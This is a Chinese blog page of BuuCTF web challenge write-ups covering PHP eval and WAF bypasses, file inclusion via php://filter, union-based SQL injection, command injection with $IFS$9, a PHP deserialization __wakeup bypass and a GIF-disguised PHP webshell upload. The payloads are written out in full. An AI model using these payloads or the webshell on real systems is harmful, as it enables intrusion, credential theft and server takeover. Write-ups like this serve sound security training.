+<h1 id="未完成-RoarCTF-2019-Easy-Calc"><a href="#未完成-RoarCTF-2019-Easy-Calc" class="headerlink" title="(未完成)[RoarCTF 2019]Easy Calc"></a>(未完成)[RoarCTF 2019]Easy Calc</h1><pre><code class="js">$(&#39;#calc&#39;).submit(function()&#123;
+        $.ajax(&#123;
+            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),
+            type:&#39;GET&#39;,
+            success:function(data)&#123;
+                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;
+            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;
+            &lt;/div&gt;`);
+            &#125;,
+            error:function()&#123;
+                alert(&quot;这啥?算不来!&quot;);
+            &#125;
+        &#125;)
+        return false;
+    &#125;)</code></pre>
+<p>访问<code>calc.php</code>得到后台源码</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+if(!isset($_GET[&#39;num&#39;]))&#123;
+    show_source(__FILE__);
+&#125;else&#123;
+        $str = $_GET[&#39;num&#39;];
+        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
+        foreach ($blacklist as $blackitem) &#123;
+                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;
+                        die(&quot;what are you want to do?&quot;);
+                &#125;
+        &#125;
+        eval(&#39;echo &#39;.$str.&#39;;&#39;);
+&#125;
+?&gt; </code></pre>
+<p>过滤的常用字符</p>
+<pre><code>`$^[]&#39;&quot;%20</code></pre>
+<p>过滤了单引号，在构造payload时用<code>chr()</code>代替</p>
+<pre><code class="php">/calc.php? num=1;var_dump(scandir(chr(47))); // /f1agg
+/calc.php? num=1;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</code></pre>
+<pre><code class="php">$payload = &quot;/f1agg&quot;;
+$arr = str_split($payload);
+foreach ($arr as $a)
+    echo &quot;chr(&quot;.ord($a).&quot;).&quot;;
+//chr(47).chr(102).chr(49).chr(97).chr(103).chr(103).</code></pre>
+<p>payload中有一个很关键的地方 num 前面有一个空格，因为题中存在 WAF，对 num 的值进行了校验，直接传 payload，会返回<code>这啥?算不来</code>，于是利用php字符串解析特性绕过 WAF，此时 WAF 检测到的变量名为<code>%20num</code>，不为 num，不进行校验，但php存储的变量名为 num</p>
+<h2 id="利用PHP的字符串解析特性"><a href="#利用PHP的字符串解析特性" class="headerlink" title="利用PHP的字符串解析特性"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性</a></h2><p>PHP将查询字符串(在URL或正文中)转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>的过程中会将某些字符<strong>删除或用下划线代替</strong></p>
+<p><strong>如果一个 IDS/IPS 或 WAF 中有一条规则是当 news_id 参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过</strong></p>
+<pre><code>%20news[id%00 // 这个变量名的值实际存储在 $_GET[&quot;news_id&quot;] 中</code></pre>
+<p><code>parse_str()</code>通常被自动应用于 get 、post 请求和 cookie 中，对 URL 传递入的查询字符串进行解析</p>
+<p>通过如下 fuzz 了解<code>parse_str()</code>如何处理特殊字符</p>
+<pre><code class="php">foreach([&quot;&#123;chr&#125;foo_bar&quot;, &quot;foo&#123;chr&#125;bar&quot;, &quot;foo_bar&#123;chr&#125;&quot;] as $k =&gt; $arg) &#123;
+    for($i=0;$i&lt;=255;$i++) &#123;
+        parse_str(str_replace(&quot;&#123;chr&#125;&quot;,chr($i),$arg),$o);
+        if(isset($o[&quot;foo_bar&quot;])) &#123;
+            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\n&quot;;
+        &#125; // bin2hex 将字符转为16进制数
+    &#125;
+    echo &quot;\n&quot;;
+&#125;</code></pre>
+<pre><code>&#123;chr&#125;foo_bar -&gt; 20 ( )
+&#123;chr&#125;foo_bar -&gt; 26 (&amp;)
+&#123;chr&#125;foo_bar -&gt; 2b (+)
+
+foo&#123;chr&#125;bar -&gt; 20 ( )
+foo&#123;chr&#125;bar -&gt; 2b (+)
+foo&#123;chr&#125;bar -&gt; 2e (.)
+foo&#123;chr&#125;bar -&gt; 5b ([)
+foo&#123;chr&#125;bar -&gt; 5f (_)
+
+foo_bar&#123;chr&#125; -&gt; 00 ()
+foo_bar&#123;chr&#125; -&gt; 26 (&amp;)
+foo_bar&#123;chr&#125; -&gt; 3d (=)</code></pre>
+<p><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small"></p>
+<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p><code>Ctrl+U</code>查看源码，发现<code>./Archive_room.php</code>；访问之后发现<code>./action.php</code></p>
+<p>访问后页面跳转到<code>./end.php</code>，进行抓包</p>
+<p><strong>action.php</strong></p>
+<pre><code class="html">&lt;html&gt;
+&lt;!--
+   secr3t.php        
+--&gt;
+&lt;/html&gt;</code></pre>
+<p>访问<code>secr3t.php</code></p>
+<p><strong>代码审计</strong></p>
+<pre><code class="php"> &lt;html&gt;
+    &lt;title&gt;secret&lt;/title&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;?php
+    highlight_file(__FILE__);
+    error_reporting(0);
+    $file=$_GET[&#39;file&#39;];
+    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
+        echo &quot;Oh no!&quot;;
+        exit();
+    &#125;
+    include($file); //a
+//flag放在了flag.php里
+?&gt;
+&lt;/html&gt;</code></pre>
+<p><strong>a处发现文件包含漏洞</strong></p>
+<p><strong>解题方法</strong></p>
+<p>直接设置payload为<code>/secr3t.php?file=flag.php</code>无法显示flag，因此使用<code>php://filter</code>进行文件读取</p>
+<pre><code>/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
+<p>对输出的base64密文进行解密即可</p>
+<h2 id="0x01-php-filter"><a href="#0x01-php-filter" class="headerlink" title="0x01 php://filter"></a>0x01 php://filter</h2><p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727161155342.png" alt="image-20200727161155342"></p>
+<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p><strong>解题思路</strong></p>
+<p>猜测后台代码如下</p>
+<pre><code class="php">$sql = SELECT * DROM database WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></pre>
+<p><strong>解题方法</strong></p>
+<p>构造payload<code>/check.php?username=admin&#39; or 1=1 %23&amp;password=1</code></p>
+<p>解密回显出<code>password</code>，md5查询无果，进行深度注入</p>
+<p>查看列数</p>
+<pre><code>/check.php?username=admin&#39; order by 3%23&amp;password=1</code></pre>
+<p>确定注入点</p>
+<pre><code>/check.php?username=&#39; union select 1,2,3%23&amp;password=1</code></pre>
+<p>查看当前库表名</p>
+<pre><code>/check.php?username=&#39; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()),3%23&amp;password=1</code></pre>
+<p>查看数据表l0ve1ysq1列名</p>
+<pre><code>/check.php?username=&#39; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;),3%23&amp;password=1</code></pre>
+<p>查看密码</p>
+<pre><code>/check.php?username=&#39; union select 1, (select group_concat(password) from l0ve1ysq1),3%23&amp;password=1</code></pre>
+<h2 id="0x01-hackbar细节"><a href="#0x01-hackbar细节" class="headerlink" title="0x01 hackbar细节"></a>0x01 hackbar细节</h2><p>如果直接输入<code>#</code>作为截断符无效，需进行<code>urlencode</code>转换为<code>%23</code>才可</p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p><strong>题目提示</strong></p>
+<pre><code>/?ip= </code></pre>
+<p><strong>解题思路</strong></p>
+<p>存在远程命令执行漏洞，利用<code>;</code>截断后可进行文件读取</p>
+<p><strong>解题方法</strong></p>
+<p>查看当今文件夹</p>
+<p><code>?ip=1;ls</code></p>
+<pre><code>PING 1 (0.0.0.1): 56 data bytes
+flag.php
+index.php</code></pre>
+<p>先查看<code>index.php</code>，了解后台逻辑后便于构造payload</p>
+<p><code>?ip=1;cat index.php</code></p>
+<pre><code>/?ip= fxck your space!</code></pre>
+<p>waf空格，利用<code>$IFS$9</code>绕过</p>
+<p><code>?ip=1;cat$IFS$9index.php</code></p>
+<p><strong>代码审计</strong></p>
+<pre><code class="php">&lt;!--?php
+if(isset($_GET[&#39;ip&#39;]))&#123;
+  $ip = $_GET[&#39;ip&#39;];
+  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\--&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
+    echo preg_match(&quot;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&amp;gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
+    die(&quot;fxck your symbol!&quot;);
+  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
+    die(&quot;fxck your space!&quot;);
+  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
+    die(&quot;fxck your bash!&quot;);
+  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
+    die(&quot;fxck your flag!&quot;);
+  &#125;
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+  echo &quot;&lt;pre&gt;&quot;;
+  print_r($a);
+&#125;</code></pre>
+<p>过滤了除<code>$</code>外大多数符号，空格，bash，还有一句比较有意思的正则表达式</p>
+<h3 id="preg-match-“-f-l-a-g-“-ip"><a href="#preg-match-“-f-l-a-g-“-ip" class="headerlink" title="preg_match(“/.*f.*l.*a.*g.*/“, $ip)"></a>preg_match(“/.*f.*l.*a.*g.*/“, $ip)</h3><p><code>.*</code>表示匹配任意字符任意次；代码的逻辑意思就是<code>flag</code>四个字母不能同顺序出现</p>
+<p>构造payload，并查看源码</p>
+<pre><code>/?ip=1;a=g;cat$IFS$9fla$a.php</code></pre>
+<h2 id="0x01-shell变量命名规范"><a href="#0x01-shell变量命名规范" class="headerlink" title="0x01 shell变量命名规范"></a>0x01 shell变量命名规范</h2><p>变量名必须是以字母或下划线字符“_”开头，后面跟字母、数字或下划线字符。不要使用特殊字符命名变量，变量名和等号之间不能有空格</p>
+<h2 id="0x02-IFS-9"><a href="#0x02-IFS-9" class="headerlink" title="0x02 $IFS$9"></a>0x02 $IFS$9</h2><h3 id="IFS内部域分隔符"><a href="#IFS内部域分隔符" class="headerlink" title="$IFS内部域分隔符"></a>$IFS内部域分隔符</h3><p>shell的环境变量分为set和env，IFS是一种 set 变量，默认值是space, tab, newline</p>
+<p><strong>查看$IFS值</strong></p>
+<pre><code class="shell">&gt; echo &quot;$IFS&quot; | od -b
+0000000 040 011 012 012
+0000004</code></pre>
+<p>“040”是空格，”011”是Tab，”012”是换行，最后一个”012”是因为echo默认换行</p>
+<h3 id="9"><a href="#9" class="headerlink" title="$9"></a>$9</h3><p>$1～$n表示添加到shell的各参数值；$0为当前文件名，$1是第1参数、$2是第2参数以此类推；$9此时为空值，在这里的作用为截断变量名，等同于<code>&#123;&#125;</code>(由于题目waf了大括号)，即限定变量名的范围；如果没有进行截断的话，IFS会接着和后面的字符连接为变量名，无法构成完整的内部域分隔符，当然也不一定非要为9，还可以是1~8的其他数字</p>
+<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><strong>题目提示</strong></p>
+<p>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</p>
+<p>文件扫描</p>
+<pre><code>python3 dirsearch.py -u url -e php
+-u url
+-e 网站语言</code></pre>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727184803212.png" alt="image-20200727184803212"></p>
+<p>下载<code>/www.zip</code></p>
+<p><strong>代码审计</strong></p>
+<pre><code class="php">----index.php
+&lt;?php
+include &#39;class.php&#39;;
+$select = $_GET[&#39;select&#39;];
+$res=unserialize(@$select);
+?&gt;
+
+----class.php
+&lt;?php
+include &#39;flag.php&#39;;
+error_reporting(0);
+
+class Name&#123;
+    private $username = &#39;nonono&#39;;
+    private $password = &#39;yesyesyes&#39;;
+
+    public function __construct($username,$password)&#123;
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    &#125;
+
+    function __wakeup()&#123;
+        $this-&gt;username = &#39;guest&#39;;
+    &#125;
+
+    function __destruct()&#123;
+        if ($this-&gt;password != 100) &#123;
+            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+            echo &quot;You name is: &quot;;
+            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+            echo &quot;You password is: &quot;;
+            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+            die();
+        &#125;
+        if ($this-&gt;username === &#39;admin&#39;) &#123;
+            global $flag;
+            echo $flag;
+        &#125;else&#123;
+            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
+            die();
+        &#125;
+    &#125;
+&#125;
+?&gt;</code></pre>
+<p><strong>解题思路</strong></p>
+<p>0x00 password = 100</p>
+<p>0x01 username = admin</p>
+<p>0x02 绕过__wakeup函数的初始化</p>
+<p>0x03 url编码</p>
+<p><strong>解题方法</strong></p>
+<pre><code class="php">echo urlencode(serialize(new Name(&#39;admin&#39;, &#39;100&#39;)));
+O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
+-&gt; 将2换3
+O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</code></pre>
+<h2 id="0x01-wakeup-amp-destruct-amp-sleep"><a href="#0x01-wakeup-amp-destruct-amp-sleep" class="headerlink" title="0x01 __wakeup() &amp; __destruct() &amp; __sleep()"></a>0x01 __wakeup() &amp; __destruct() &amp; __sleep()</h2><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>在程序执行前，serialize() 函数会首先检查是否存在 __sleep().如果存在，__sleep()方法会先被调用，然后才执行序列化</p>
+<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>触发于unserilize()调用之前, <strong>但当反序列化时的字符串所对应的对象的数目被修改，__wake()函数就不会被调用</strong>，从而实现绕过</p>
+<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>在到对象的所有引用都被删除或者当对象被显式销毁时执行</p>
+<h2 id="0x02-对序列化结果进行url编码"><a href="#0x02-对序列化结果进行url编码" class="headerlink" title="0x02 对序列化结果进行url编码"></a>0x02 对序列化结果进行url编码</h2><p>因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上<code>%00</code>前缀字符串长度也包括所加前缀的长度</p>
+<p>但如果不进行url编码直接使用payload，可以很明显发现<code>%00</code>字符消失，自然会导致失败</p>
+<pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</code></pre>
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p><strong>解题思路</strong></p>
+<p><code>/?file=flag.php</code>猜测存在文件包含漏洞</p>
+<p><strong>解题方法</strong></p>
+<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre>
+<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p><strong>题目提示</strong></p>
+<p><code>eval($_POST[&quot;Syc&quot;]);</code></p>
+<p><strong>解题方法</strong></p>
+<p>蚁剑连接</p>
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><strong>解题方法</strong></p>
+<p>查看源码，访问<code>Secret.php</code>，会连续出现三个要求，设置http头即可</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727192826010.png" alt="image-20200727192826010"></p>
+<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p><strong>解题方法</strong></p>
+<pre><code>target=;cd ..;cd ..;cd ..;cat flag</code></pre>
+<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p><strong>解题思路</strong></p>
+<p>猜测后台代码如下</p>
+<pre><code class="php">$sql = SELECT * DROM database WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></pre>
+<p><strong>解题方法</strong></p>
+<p>构造payload<code>/check.php?username=admin&#39; or 1=1 %23&amp;password=1</code>，观察回显猜测过滤<code>or</code>，尝试双写绕过</p>
+<pre><code>/check.php?username=admin&#39; oorr 1=1 %23&amp;password=1</code></pre>
+<p>回显成功，进行深度注入，再根据回显进行双写</p>
+<p>查看数据表名</p>
+<pre><code>?username=admin&amp;password=&#39; ununionion selselectect 1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()),3%23</code></pre>
+<p>查看b4bsql密码</p>
+<pre><code>?username=admin&amp;password=&#39; ununionion selselectect 1,(selselectect group_concat(passwoorrd) frfromom b4bsql),3%23</code></pre>
+<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p><strong>解题思路</strong></p>
+<p>上传含webshell的可执行文件</p>
+<p><strong>解题方法</strong></p>
+<p>创建图片马</p>
+<pre><code>trojan.gif
+GIF89a&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code></pre>
+<p>上传图片并更改文件后缀，由于php等一系列后缀被过滤，故使用<code>phtml</code></p>
+<pre><code>POST /upload_file.php HTTP/1.1
+Host: 338d1805-c3c7-4b7c-8dde-950a068bc645.node3.buuoj.cn
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------12241674773713346554132597235
+Content-Length: 399
+Origin: http://338d1805-c3c7-4b7c-8dde-950a068bc645.node3.buuoj.cn
+Connection: close
+Referer: http://338d1805-c3c7-4b7c-8dde-950a068bc645.node3.buuoj.cn/
+Upgrade-Insecure-Requests: 1
+
+-----------------------------12241674773713346554132597235
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;trojan.phtml&quot;
+Content-Type: image/gif
+
+GIF89a&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;
+
+-----------------------------12241674773713346554132597235
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+提交
+-----------------------------12241674773713346554132597235--</code></pre>
+<p>文件上传至<code>/upload</code>文件夹，蚁剑连接</p>
+<h2 id="0x01图片文件头欺骗"><a href="#0x01图片文件头欺骗" class="headerlink" title="0x01图片文件头欺骗"></a>0x01图片文件头欺骗</h2><p>GIF89a图形文件是一个根据图形交换格式(GIF)89a版(1989年7月发行)进行格式化之后的图形，再文件头部加上GIF89a，后台检测会判定为图片</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/wechat.png"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre full previous">
+          
+            <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.html" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                BuuCTF Web writeup 第二部分</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="https://0xgeekcat.github.io/" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/custom/avatar.jpg" itemprop="image" alt="0xGeekCat" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://0xgeekcat.github.io/" itemprop="url" rel="author">0xGeekCat</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 0xGeekCat<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1","name":"/video/The-Pet-Girl-of-Sakurasou.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1","name":"/video/The-Pet-Girl-of-Sakurasou.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
